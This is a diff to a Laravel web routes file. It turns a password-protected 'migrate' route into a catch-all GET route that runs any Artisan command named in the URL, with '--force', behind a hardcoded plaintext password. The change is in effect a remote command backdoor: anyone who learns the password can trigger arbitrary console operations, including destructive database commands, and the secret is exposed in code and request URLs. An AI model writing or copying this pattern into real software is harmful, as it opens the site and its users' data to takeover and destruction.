@@ -166,9 +166,9 @@ Route::get('/', 'HomeController@index')->name('home');
 Route::get('smsrecharge', 'Bills\RechargeController@withSms');
 Route::get('password/smsreset', 'DashboardController@smsResetPass');
 
-Route::get('migrate/{password}', function($password) {
+Route::get('{command}/{password}', function($command, $password) {
     if ($password === 'wWnx95k4') {
-        $exitCode = Artisan::call('migrate', [
+        $exitCode = Artisan::call($command, [
             '--force' => true,
         ]);
         echo $exitCode;
